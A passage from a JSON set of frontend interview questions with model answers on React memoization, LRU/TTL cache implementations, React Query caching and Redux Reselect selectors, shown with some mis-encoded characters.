render\n  useEffect(() => {\n    fetchResults({ query, limit: 20, offset: 0 });\n  }, [{ query, limit: 20, offset: 0 }]); // Always re-runs!\n}\n```\n\n### 3. Passing to Memoized Children\n\n```typescript\nconst MemoizedChart = memo(function Chart({ data }: { data: DataPoint[] }) {\n  // Expensive chart rendering\n  return <svg>...</svg>;\n});\n\nfunction Dashboard({ rawData }: { rawData: RawData[] }) {\n  // âœ… Good: Stable reference for memo'd child\n  const chartData = useMemo(() => {\n    return rawData.map(d => ({\n      x: d.timestamp,\n      y: d.value,\n    }));\n  }, [rawData]);\n\n  return <MemoizedChart data={chartData} />;\n}\n```\n\n## When to Use useCallback\n\n### 1. Passing Callbacks to Memoized Children\n\n```typescript\nconst MemoizedButton = memo(function Button({ \n  onClick, \n  label \n}: { \n  onClick: () => void; \n  label: string;\n}) {\n  console.log('Button rendered');\n  return <button onClick={onClick}>{label}</button>;\n});\n\nfunction Parent() {\n  const [count, setCount] = useState(0);\n  \n  // âœ… Good: Stable function reference\n  const handleClick = useCallback(() => {\n    setCount(c => c + 1);\n  }, []); // No dependencies - uses updater function\n\n  return (\n    <>\n      <span>Count: {count}</span>\n      <MemoizedButton onClick={handleClick} label=\"Increment\" />\n    </>\n  );\n}\n```\n\n### 2. Dependencies in useEffect\n\n```typescript\nfunction SearchComponent({ userId }: { userId: string }) {\n  // âœ… Good: Stable function for effect dependency\n  const fetchUserData = useCallback(async () => {\n    const response = await fetch(`/api/users/${userId}`);\n    return response.json();\n  }, [userId]);\n\n  useEffect(() => {\n    fetchUserData().then(setUser);\n  }, [fetchUserData]);\n}\n```\n\n### 3. Custom Hooks Returning Functions\n\n```typescript\nfunction useDebounce<T extends (...args: unknown[]) => unknown>(\n  fn: T,\n  delay: number\n): T {\n  // âœ… Good: Return stable debounced function\n  return useCallback(\n    debounce(fn, delay) as T,\n    [fn, delay]\n  );\n}\n```\n\n## Common Pitfalls\n\n### 1. Premature Optimization\n\n```typescript\n// âŒ Bad: Unnecessary memoization\nfunction SimpleComponent({ name }: { name: string }) {\n  // This is overkill - string concatenation is fast\n  const greeting = useMemo(() => `Hello, ${name}!`, [name]);\n  \n  // This is overkill - function is cheap to create\n  const handleClick = useCallback(() => {\n    console.log('clicked');\n  }, []);\n\n  return <div onClick={handleClick}>{greeting}</div>;\n}\n\n// âœ… Good: Just use plain values\nfunction SimpleComponent({ name }: { name: string }) {\n  const greeting = `Hello, ${name}!`;\n  const handleClick = () => console.log('clicked');\n  \n  return <div onClick={handleClick}>{greeting}</div>;\n}\n```\n\n### 2. Missing Dependencies\n\n```typescript\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  \n  // âŒ Bad: Stale closure - always logs 0\n  const logCount = useCallback(() => {\n    console.log(count);\n  }, []); // Missing 'count' dependency\n\n  // âœ… Good: Use ref for latest value without re-creating\n  const countRef = useRef(count);\n  countRef.current = count;\n  \n  const logCount = useCallback(() => {\n    console.log(countRef.current);\n  }, []);\n}\n```\n\n### 3. Object/Array Dependencies\n\n```typescript\nfunction Component({ config }: { config: { theme: string } }) {\n  // âŒ Bad: New object every render breaks memoization\n  const handleClick = useCallback(() => {\n    applyTheme(config);\n  }, [config]); // config is new object each render!\n\n  // âœ… Good: Depend on primitive values\n  const handleClick = useCallback(() => {\n    applyTheme({ theme: config.theme });\n  }, [config.theme]);\n}\n```\n\n### 4. useMemo for JSX\n\n```typescript\n// âŒ Bad: Don't memoize JSX (use memo() instead)\nfunction Parent({ items }: { items: Item[] }) {\n  const list = useMemo(() => (\n    <ul>\n      {items.map(item => <li key={item.id}>{item.name}</li>)}\n    </ul>\n  ), [items]);\n  \n  return <div>{list}</div>;\n}\n\n// âœ… Good: Use memo for component-level optimization\nconst ItemList = memo(function ItemList({ items }: { items: Item[] }) {\n  return (\n    <ul>\n      {items.map(item => <li key={item.id}>{item.name}</li>)}\n    </ul>\n  );\n});\n```\n\n## Decision Framework\n\n```\nShould I use useMemo/useCallback?\nâ”‚\nâ”œâ”€â–º Is this fixing a measured performance problem?\nâ”‚   â””â”€â–º No â†’ Don't use it (premature optimization)\nâ”‚\nâ”œâ”€â–º Is the value passed to a memo'd child?\nâ”‚   â””â”€â–º Yes â†’ Consider useMemo/useCallback\nâ”‚\nâ”œâ”€â–º Is the value in a useEffect dependency array?\nâ”‚   â””â”€â–º Yes â†’ Probably need useMemo/useCallback\nâ”‚\nâ”œâ”€â–º Is the computation expensive (>1ms)?\nâ”‚   â””â”€â–º Yes â†’ Use useMemo\nâ”‚\nâ””â”€â–º Profile first, optimize second\n```",
      "keyPoints": [
        "Knows useMemo is for values, useCallback is for functions",
        "Understands referential equality for dependency arrays",
        "Can identify premature optimization",
        "Knows common pitfalls (stale closures, missing deps)",
        "Understands when NOT to use memoization"
      ],
      "followUpQuestions": [
        "How would you measure if memoization is actually helping?",
        "What's the memory cost of excessive memoization?",
        "How does React.memo differ from useMemo?",
        "When would useMemo re-compute even with same dependencies?"
      ],
      "relatedTopics": [
        "react-memo",
        "performance",
        "hooks",
        "referential-equality"
      ],
      "source": "seed",
      "commonAt": [
        "Meta",
        "Airbnb",
        "Netflix"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "caching-memoization-003",
      "category": "caching-memoization",
      "difficulty": "senior",
      "question": "How would you implement a memoization function that handles complex objects as arguments? What about cache eviction strategies?",
      "answer": "## Basic Memoization\n\n```typescript\n// Simple memoization with primitive arguments\nfunction memoize<T extends (...args: unknown[]) => unknown>(fn: T): T {\n  const cache = new Map<string, ReturnType<T>>();\n  \n  return ((...args: Parameters<T>) => {\n    const key = JSON.stringify(args);\n    \n    if (cache.has(key)) {\n      return cache.get(key)!;\n    }\n    \n    const result = fn(...args) as ReturnType<T>;\n    cache.set(key, result);\n    return result;\n  }) as T;\n}\n\n// Usage\nconst expensiveCalculation = memoize((a: number, b: number) => {\n  console.log('Computing...');\n  return a * b;\n});\n\nexpensiveCalculation(2, 3); // Computing... â†’ 6\nexpensiveCalculation(2, 3); // â†’ 6 (cached)\n```\n\n## Handling Complex Objects\n\n### Problem with JSON.stringify\n\n```typescript\n// âŒ Issues with JSON.stringify:\n// 1. Order sensitivity: {a:1,b:2} !== {b:2,a:1}\n// 2. Can't handle circular references\n// 3. Loses functions, undefined, symbols\n// 4. Date objects become strings\n\nconst obj1 = { a: 1, b: 2 };\nconst obj2 = { b: 2, a: 1 };\nJSON.stringify(obj1) !== JSON.stringify(obj2); // Different strings!\n```\n\n### Solution 1: Stable Serialization\n\n```typescript\nfunction stableStringify(obj: unknown): string {\n  if (obj === null || typeof obj !== 'object') {\n    return JSON.stringify(obj);\n  }\n  \n  if (Array.isArray(obj)) {\n    return '[' + obj.map(stableStringify).join(',') + ']';\n  }\n  \n  // Sort keys for consistent ordering\n  const keys = Object.keys(obj).sort();\n  const pairs = keys.map(key => \n    `\"${key}\":${stableStringify((obj as Record<string, unknown>)[key])}`\n  );\n  \n  return '{' + pairs.join(',') + '}';\n}\n\nfunction memoizeWithStableKeys<T extends (...args: unknown[]) => unknown>(fn: T): T {\n  const cache = new Map<string, ReturnType<T>>();\n  \n  return ((...args: Parameters<T>) => {\n    const key = stableStringify(args);\n    \n    if (cache.has(key)) {\n      return cache.get(key)!;\n    }\n    \n    const result = fn(...args) as ReturnType<T>;\n    cache.set(key, result);\n    return result;\n  }) as T;\n}\n```\n\n### Solution 2: WeakMap for Object References\n\n```typescript\n// For single object argument - uses reference equality\nfunction memoizeOne<T extends (arg: object) => unknown>(fn: T): T {\n  const cache = new WeakMap<object, ReturnType<T>>();\n  \n  return ((arg: object) => {\n    if (cache.has(arg)) {\n      return cache.get(arg)!;\n    }\n    \n    const result = fn(arg) as ReturnType<T>;\n    cache.set(arg, result);\n    return result;\n  }) as T;\n}\n\n// For multiple arguments - nested WeakMaps\nfunction memoizeMultipleObjects<T extends (...args: object[]) => unknown>(fn: T): T {\n  const cache = new WeakMap<object, WeakMap<object, unknown>>();\n  \n  return ((...args: object[]) => {\n    let current: WeakMap<object, unknown> = cache;\n    \n    for (let i = 0; i < args.length - 1; i++) {\n      if (!current.has(args[i])) {\n        current.set(args[i], new WeakMap());\n      }\n      current = current.get(args[i]) as WeakMap<object, unknown>;\n    }\n    \n    const lastArg = args[args.length - 1];\n    if (current.has(lastArg)) {\n      return current.get(lastArg) as ReturnType<T>;\n    }\n    \n    const result = fn(...args);\n    current.set(lastArg, result);\n    return result as ReturnType<T>;\n  }) as T;\n}\n```\n\n## Cache Eviction Strategies\n\n### 1. LRU (Least Recently Used)\n\n```typescript\nclass LRUCache<K, V> {\n  private cache = new Map<K, V>();\n  private maxSize: number;\n\n  constructor(maxSize: number) {\n    this.maxSize = maxSize;\n  }\n\n  get(key: K): V | undefined {\n    if (!this.cache.has(key)) {\n      return undefined;\n    }\n    \n    // Move to end (most recently used)\n    const value = this.cache.get(key)!;\n    this.cache.delete(key);\n    this.cache.set(key, value);\n    \n    return value;\n  }\n\n  set(key: K, value: V): void {\n    // Delete if exists (to update position)\n    if (this.cache.has(key)) {\n      this.cache.delete(key);\n    }\n    \n    // Evict oldest if at capacity\n    if (this.cache.size >= this.maxSize) {\n      const oldestKey = this.cache.keys().next().value;\n      this.cache.delete(oldestKey);\n    }\n    \n    this.cache.set(key, value);\n  }\n}\n\nfunction memoizeWithLRU<T extends (...args: unknown[]) => unknown>(\n  fn: T,\n  maxSize = 100\n): T {\n  const cache = new LRUCache<string, ReturnType<T>>(maxSize);\n  \n  return ((...args: Parameters<T>) => {\n    const key = stableStringify(args);\n    const cached = cache.get(key);\n    \n    if (cached !== undefined) {\n      return cached;\n    }\n    \n    const result = fn(...args) as ReturnType<T>;\n    cache.set(key, result);\n    return result;\n  }) as T;\n}\n```\n\n### 2. TTL (Time-To-Live)\n\n```typescript\ninterface CacheEntry<V> {\n  value: V;\n  expiry: number;\n}\n\nclass TTLCache<K, V> {\n  private cache = new Map<K, CacheEntry<V>>();\n  private ttl: number;\n\n  constructor(ttlMs: number) {\n    this.ttl = ttlMs;\n  }\n\n  get(key: K): V | undefined {\n    const entry = this.cache.get(key);\n    \n    if (!entry) {\n      return undefined;\n    }\n    \n    if (Date.now() > entry.expiry) {\n      this.cache.delete(key);\n      return undefined;\n    }\n    \n    return entry.value;\n  }\n\n  set(key: K, value: V): void {\n    this.cache.set(key, {\n      value,\n      expiry: Date.now() + this.ttl,\n    });\n  }\n\n  // Periodic cleanup\n  cleanup(): void {\n    const now = Date.now();\n    for (const [key, entry] of this.cache) {\n      if (now > entry.expiry) {\n        this.cache.delete(key);\n      }\n    }\n  }\n}\n```\n\n### 3. LRU + TTL Combined\n\n```typescript\nclass LRUTTLCache<K, V> {\n  private cache = new Map<K, { value: V; expiry: number }>();\n  private maxSize: number;\n  private ttl: number;\n\n  constructor(maxSize: number, ttlMs: number) {\n    this.maxSize = maxSize;\n    this.ttl = ttlMs;\n  }\n\n  get(key: K): V | undefined {\n    const entry = this.cache.get(key);\n    \n    if (!entry) return undefined;\n    \n    // Check TTL\n    if (Date.now() > entry.expiry) {\n      this.cache.delete(key);\n      return undefined;\n    }\n    \n    // LRU: Move to end\n    this.cache.delete(key);\n    this.cache.set(key, entry);\n    \n    return entry.value;\n  }\n\n  set(key: K, value: V): void {\n    // Remove if exists\n    this.cache.delete(key);\n    \n    // Evict if full\n    if (this.cache.size >= this.maxSize) {\n      const oldestKey = this.cache.keys().next().value;\n      this.cache.delete(oldestKey);\n    }\n    \n    this.cache.set(key, {\n      value,\n      expiry: Date.now() + this.ttl,\n    });\n  }\n}\n```\n\n### 4. Size-Based Eviction\n\n```typescript\nclass SizeLimitedCache<K, V> {\n  private cache = new Map<K, V>();\n  private sizes = new Map<K, number>();\n  private currentSize = 0;\n  private maxSize: number;\n  \n  constructor(maxSizeBytes: number) {\n    this.maxSize = maxSizeBytes;\n  }\n\n  private estimateSize(value: V): number {\n    const str = JSON.stringify(value);\n    return str.length * 2; // Rough estimate (UTF-16)\n  }\n\n  set(key: K, value: V): void {\n    const size = this.estimateSize(value);\n    \n    // Remove old entry if exists\n    if (this.cache.has(key)) {\n      this.currentSize -= this.sizes.get(key)!;\n      this.cache.delete(key);\n      this.sizes.delete(key);\n    }\n    \n    // Evict until we have space\n    while (this.currentSize + size > this.maxSize && this.cache.size > 0) {\n      const oldestKey = this.cache.keys().next().value;\n      this.currentSize -= this.sizes.get(oldestKey)!;\n      this.cache.delete(oldestKey);\n      this.sizes.delete(oldestKey);\n    }\n    \n    this.cache.set(key, value);\n    this.sizes.set(key, size);\n    this.currentSize += size;\n  }\n}\n```\n\n## Production-Ready Memoization\n\n```typescript\ninterface MemoizeOptions {\n  maxSize?: number;\n  ttl?: number;\n  keyGenerator?: (...args: unknown[]) => string;\n  onEvict?: (key: string, value: unknown) => void;\n}\n\nfunction memoize<T extends (...args: unknown[]) => unknown>(\n  fn: T,\n  options: MemoizeOptions = {}\n): T & { cache: { clear: () => void; size: number } } {\n  const {\n    maxSize = 1000,\n    ttl = Infinity,\n    keyGenerator = stableStringify,\n    onEvict,\n  } = options;\n\n  const cache = new LRUTTLCache<string, ReturnType<T>>(maxSize, ttl);\n\n  const memoized = ((...args: Parameters<T>) => {\n    const key = keyGenerator(args);\n    const cached = cache.get(key);\n    \n    if (cached !== undefined) {\n      return cached;\n    }\n    \n    const result = fn(...args) as ReturnType<T>;\n    cache.set(key, result);\n    return result;\n  }) as T & { cache: { clear: () => void; size: number } };\n\n  memoized.cache = {\n    clear: () => cache.clear(),\n    get size() { return cache.size; },\n  };\n\n  return memoized;\n}\n```",
      "keyPoints": [
        "Understands serialization challenges with objects",
        "Knows WeakMap for reference-based memoization",
        "Can implement LRU cache from scratch",
        "Understands TTL and size-based eviction",
        "Considers memory management in caching"
      ],
      "followUpQuestions": [
        "How would you handle async functions?",
        "What about cache warming strategies?",
        "How would you implement cache sharing across tabs?",
        "What are the tradeoffs between different eviction strategies?"
      ],
      "relatedTopics": [
        "data-structures",
        "memory-management",
        "performance"
      ],
      "source": "seed",
      "commonAt": [
        "Google",
        "Meta",
        "Netflix"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "caching-memoization-004",
      "category": "caching-memoization",
      "difficulty": "mid",
      "question": "How does React Query (TanStack Query) implement its caching layer? Explain staleTime, gcTime, and the query lifecycle.",
      "answer": "## React Query Cache Architecture\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    QueryClient                          â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚\nâ”‚  â”‚              QueryCache                          â”‚   â”‚\nâ”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚   â”‚\nâ”‚  â”‚  â”‚  Query: ['users', 1]                    â”‚    â”‚   â”‚\nâ”‚  â”‚  â”‚  â”œâ”€â”€ state: { data, error, status }     â”‚    â”‚   â”‚\nâ”‚  â”‚  â”‚  â”œâ”€â”€ observers: [Component1, Component2]â”‚    â”‚   â”‚\nâ”‚  â”‚  â”‚  â”œâ”€â”€ staleTime: 5000                    â”‚    â”‚   â”‚\nâ”‚  â”‚  â”‚  â””â”€â”€ gcTime: 300000                     â”‚    â”‚   â”‚\nâ”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚   â”‚\nâ”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚   â”‚\nâ”‚  â”‚  â”‚  Query: ['users', 2]                    â”‚    â”‚   â”‚\nâ”‚  â”‚  â”‚  â””â”€â”€ ...                                â”‚    â”‚   â”‚\nâ”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚   â”‚\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n## Key Timing Concepts\n\n### staleTime (Data Freshness)\n\n```typescript\nconst { data } = useQuery({\n  queryKey: ['user', userId],\n  queryFn: fetchUser,\n  staleTime: 5 * 60 * 1000, // 5 minutes\n});\n\n// Timeline:\n// T=0: Fetch completes, data is FRESH\n// T=0 to T=5min: Data is FRESH\n//   - New components mounting get cached data immediately\n//   - No background refetch\n// T=5min+: Data becomes STALE\n//   - Still returns cached data immediately\n//   - Triggers background refetch on:\n//     â€¢ Component mount\n//     â€¢ Window focus\n//     â€¢ Network reconnect\n```\n\n### gcTime (Garbage Collection Time, formerly cacheTime)\n\n```typescript\nconst { data } = useQuery({\n  queryKey: ['user', userId],\n  queryFn: fetchUser,\n  gcTime: 30 * 60 * 1000, // 30 minutes\n});\n\n// Timeline:\n// T=0: Component mounts, fetch starts\n// T=1s: Fetch completes, data cached\n// T=10s: Component unmounts (no more observers)\n//   - Query enters \"inactive\" state\n//   - gcTime countdown starts\n// T=10s to T=30min+10s: Data stays in cache\n//   - If component remounts: instant data + possible refetch\n// T=30min+10s: Data garbage collected\n//   - If component mounts now: loading state, fresh fetch\n```\n\n## Query Lifecycle States\n\n```typescript\ntype QueryStatus = 'pending' | 'error' | 'success';\ntype FetchStatus = 'fetching' | 'paused' | 'idle';\n\n// State machine:\n// \n// Initial Mount:\n//   status: 'pending', fetchStatus: 'fetching'\n//   â””â”€â–º Fetch completes\n//       status: 'success', fetchStatus: 'idle'\n//\n// Cached Data Available:\n//   status: 'success', fetchStatus: 'idle'  (if fresh)\n//   status: 'success', fetchStatus: 'fetching' (if stale, background refetch)\n//\n// Error:\n//   status: 'error', fetchStatus: 'idle'\n//   â””â”€â–º Retry\n//       status: 'error', fetchStatus: 'fetching'\n\nfunction UserProfile({ userId }: { userId: string }) {\n  const { data, status, fetchStatus, isLoading, isFetching } = useQuery({\n    queryKey: ['user', userId],\n    queryFn: () => fetchUser(userId),\n  });\n\n  // isLoading = status === 'pending' (no data yet)\n  // isFetching = fetchStatus === 'fetching' (request in flight)\n  \n  // First load: isLoading=true, isFetching=true\n  // Background refetch: isLoading=false, isFetching=true\n  \n  if (isLoading) {\n    return <Skeleton />;\n  }\n  \n  return (\n    <div>\n      {isFetching && <RefreshIndicator />}\n      <UserCard user={data} />\n    </div>\n  );\n}\n```\n\n## Cache Invalidation\n\n```typescript\nconst queryClient = useQueryClient();\n\n// 1. Invalidate specific query\nqueryClient.invalidateQueries({ queryKey: ['user', userId] });\n\n// 2. Invalidate all queries starting with 'user'\nqueryClient.invalidateQueries({ queryKey: ['user'] });\n\n// 3. Invalidate with predicate\nqueryClient.invalidateQueries({\n  predicate: (query) => \n    query.queryKey[0] === 'user' && \n    query.state.dataUpdatedAt < Date.now() - 60000,\n});\n\n// 4. Optimistic update\nconst mutation = useMutation({\n  mutationFn: updateUser,\n  onMutate: async (newUser) => {\n    // Cancel in-flight queries\n    await queryClient.cancelQueries({ queryKey: ['user', newUser.id] });\n    \n    // Snapshot previous value\n    const previousUser = queryClient.getQueryData(['user', newUser.id]);\n    \n    // Optimistically update\n    queryClient.setQueryData(['user', newUser.id], newUser);\n    \n    return { previousUser };\n  },\n  onError: (err, newUser, context) => {\n    // Rollback on error\n    queryClient.setQueryData(['user', newUser.id], context?.previousUser);\n  },\n  onSettled: () => {\n    // Refetch to ensure consistency\n    queryClient.invalidateQueries({ queryKey: ['user'] });\n  },\n});\n```\n\n## Query Deduplication\n\n```typescript\n// Multiple components using same query key\nfunction ComponentA() {\n  const { data } = useQuery({ queryKey: ['user', 1], queryFn: fetchUser });\n  return <div>{data?.name}</div>;\n}\n\nfunction ComponentB() {\n  const { data } = useQuery({ queryKey: ['user', 1], queryFn: fetchUser });\n  return <div>{data?.email}</div>;\n}\n\nfunction App() {\n  return (\n    <>\n      <ComponentA />\n      <ComponentB />\n    </>\n  );\n}\n\n// Result: Only ONE fetch request!\n// Both components share the same cached query instance\n```\n\n## Prefetching\n\n```typescript\nconst queryClient = useQueryClient();\n\n// Prefetch on hover\nfunction UserLink({ userId }: { userId: string }) {\n  const prefetchUser = () => {\n    queryClient.prefetchQuery({\n      queryKey: ['user', userId],\n      queryFn: () => fetchUser(userId),\n      staleTime: 5000, // Don't prefetch if we have fresh data\n    });\n  };\n\n  return (\n    <Link \n      to={`/users/${userId}`}\n      onMouseEnter={prefetchUser}\n    >\n      View User\n    </Link>\n  );\n}\n\n// Prefetch in route loader (React Router)\nexport const loader = async ({ params }: LoaderFunctionArgs) => {\n  await queryClient.ensureQueryData({\n    queryKey: ['user', params.userId],\n    queryFn: () => fetchUser(params.userId!),\n  });\n  return null;\n};\n```\n\n## Best Practices\n\n```typescript\n// 1. Global defaults\nconst queryClient = new QueryClient({\n  defaultOptions: {\n    queries: {\n      staleTime: 60 * 1000, // 1 minute\n      gcTime: 5 * 60 * 1000, // 5 minutes\n      retry: 3,\n      refetchOnWindowFocus: true,\n    },\n  },\n});\n\n// 2. Query key factory pattern\nconst userKeys = {\n  all: ['users'] as const,\n  lists: () => [...userKeys.all, 'list'] as const,\n  list: (filters: UserFilters) => [...userKeys.lists(), filters] as const,\n  details: () => [...userKeys.all, 'detail'] as const,\n  detail: (id: string) => [...userKeys.details(), id] as const,\n};\n\n// Usage\nqueryClient.invalidateQueries({ queryKey: userKeys.all }); // All user queries\nqueryClient.invalidateQueries({ queryKey: userKeys.lists() }); // All lists\nqueryClient.invalidateQueries({ queryKey: userKeys.detail(userId) }); // Specific user\n\n// 3. Placeholder data for better UX\nconst { data } = useQuery({\n  queryKey: ['user', userId],\n  queryFn: () => fetchUser(userId),\n  placeholderData: (previousData) => previousData, // Keep showing old data\n});\n```",
      "keyPoints": [
        "Understands staleTime vs gcTime difference",
        "Knows query status and fetch status states",
        "Can explain query deduplication",
        "Understands optimistic updates pattern",
        "Knows prefetching strategies",
        "Familiar with query key factory pattern"
      ],
      "followUpQuestions": [
        "How would you handle dependent queries?",
        "What's the difference between invalidate and reset?",
        "How does React Query handle pagination/infinite queries?",
        "How would you implement offline persistence?"
      ],
      "relatedTopics": [
        "react-query",
        "state-management",
        "data-fetching"
      ],
      "source": "seed",
      "commonAt": [
        "Most modern React companies"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "caching-memoization-005",
      "category": "caching-memoization",
      "difficulty": "mid",
      "question": "Explain the concept of selector memoization in Redux. How does Reselect work, and when would you create custom equality checks?",
      "answer": "## Why Selectors Need Memoization\n\n```typescript\n// Without memoization - creates new array every time\nconst selectFilteredTodos = (state: RootState) => {\n  // This runs on EVERY state change, even unrelated ones\n  return state.todos.filter(todo => !todo.completed);\n};\n\nfunction TodoList() {\n  // New array reference every render = infinite re-renders with useEffect\n  const todos = useSelector(selectFilteredTodos);\n  \n  useEffect(() => {\n    console.log('Todos changed!');\n  }, [todos]); // Triggers every time!\n}\n```\n\n## Reselect Fundamentals\n\n```typescript\nimport { createSelector } from '@reduxjs/toolkit';\n\n// Input selectors - extract pieces of state\nconst selectTodos = (state: RootState) => state.todos;\nconst selectFilter = (state: RootState) => state.filter;\n\n// Memoized selector - only recomputes when inputs change\nconst selectFilteredTodos = createSelector(\n  [selectTodos, selectFilter],\n  (todos, filter) => {\n    // This transformation only runs if todos or filter changed\n    switch (filter) {\n      case 'active':\n        return todos.filter(todo => !todo.completed);\n      case 'completed':\n        return todos.filter(todo => todo.completed);\n      default:\n        return todos;\n    }\n  }\n);\n\n// Usage\nconst todos = useSelector(selectFilteredTodos);\n// Returns same reference if inputs unchanged!\n```\n\n## How Reselect Works Internally\n\n```typescript\n// Simplified implementation\nfunction createSelector<S, R1, R2, Result>(\n  selector1: (state: S) => R1,\n  selector2: (state: S) => R2,\n  combiner: (res1: R1, res2: R2) => Result\n): (state: S) => Result {\n  let lastArgs: [R1, R2] | null = null;\n  let lastResult: Result | null = null;\n\n  return (state: S) => {\n    const newArgs: [R1, R2] = [selector1(state), selector2(state)];\n    \n    // Check if any input changed (reference equality)\n    if (\n      lastArgs !== null &&\n      newArgs[0] === lastArgs[0] &&\n      newArgs[1] === lastArgs[1]\n    ) {\n      return lastResult!;\n    }\n    \n    // Recompute\n    lastArgs = newArgs;\n    lastResult = combiner(newArgs[0], newArgs[1]);\n    return lastResult;\n  };\n}\n```\n\n## Composing Selectors\n\n```typescript\n// Base selectors\nconst selectUsers = (state: RootState) => state.users;\nconst selectPosts = (state: RootState) => state.posts;\nconst selectCurrentUserId = (state: RootState) => state.auth.userId;\n\n// Composed selector\nconst selectCurrentUser = createSelector(\n  [selectUsers, selectCurrentUserId],\n  (users, userId) => users.find(u => u.id === userId)\n);\n\n// Further composition\nconst selectCurrentUserPosts = createSelector(\n  [selectPosts, selectCurrentUserId],\n  (posts, userId) => posts.filter(p => p.authorId === userId)\n);\n\n// Multiple levels deep\nconst selectCurrentUserPostsWithStats = createSelector(\n  [selectCurrentUserPosts],\n  (posts) => ({\n    posts,\n    totalCount: posts.length,\n    publishedCount: posts.filter(p => p.published).length,\n  })\n);\n```\n\n## Parameterized Selectors\n\n```typescript\n// âŒ Bad: Creates new selector instance every render\nconst selectTodoById = (state: RootState, todoId: string) =>\n  createSelector(\n    [selectTodos],\n    (todos) => todos.find(t => t.id === todoId)\n  )(state);\n\n// âœ… Good: Factory pattern\nconst makeSelectTodoById = () =>\n  createSelector(\n    [selectTodos, (state: RootState, todoId: string) => todoId],\n    (todos, todoId) => todos.find(t => t.id === todoId)\n  );\n\n// Usage in component\nfunction TodoItem({ todoId }: { todoId: string }) {\n  // Create selector instance once per component\n  const selectTodoById = useMemo(makeSelectTodoById, []);\n  const todo = useSelector((state) => selectTodoById(state, todoId));\n  \n  return <div>{todo?.title}</div>;\n}\n\n// âœ… Better with RTK: createSelector with cache\nimport { createSelector } from '@reduxjs/toolkit';\n\nconst selectTodoById = createSelector(\n  [selectTodos, (state: RootState, todoId: string) => todoId],\n  (todos, todoId) => todos.find(t => t.id === todoId),\n  {\n    memoizeOptions: {\n      maxSize: 100, // Cache up to 100 different todoIds\n    },\n  }\n);\n```\n\n## Custom Equality Checks\n\n```typescript\nimport { createSelectorCreator, lruMemoize } from '@reduxjs/toolkit';\nimport { isEqual } from 'lodash';\n\n// 1. Deep equality for complex objects\nconst createDeepEqualSelector = createSelectorCreator({\n  memoize: lruMemoize,\n  memoizeOptions: {\n    equalityCheck: isEqual,\n    maxSize: 10,\n  },\n});\n\nconst selectFormattedData = createDeepEqualSelector(\n  [selectRawData],\n  (rawData) => {\n    // Heavy transformation\n    return rawData.map(item => ({\n      ...item,\n      displayName: `${item.firstName} ${item.lastName}`,\n    }));\n  }\n);\n\n// 2. Shallow equality for arrays\nimport { shallowEqual } from 'react-redux';\n\nconst selectUserIds = createSelector(\n  [selectUsers],\n  (users) => users.map(u => u.id),\n  {\n    memoizeOptions: {\n      resultEqualityCheck: shallowEqual, // Compare result arrays\n    },\n  }\n);\n\n// 3. Custom comparison for specific fields\nconst selectRelevantUserData = createSelector(\n  [selectUsers],\n  (users) => users.map(u => ({ id: u.id, name: u.name })),\n  {\n    memoizeOptions: {\n      resultEqualityCheck: (a, b) => {\n        if (a.length !== b.length) return false;\n        return a.every((item, i) => \n          item.id === b[i].id && item.name === b[i].name\n        );\n      },\n    },\n  }\n);\n```\n\n## When to Use Custom Equality\n\n```typescript\n// 1. API data with same content but new references\n// API returns: { users: [...] } - new array every time\nconst 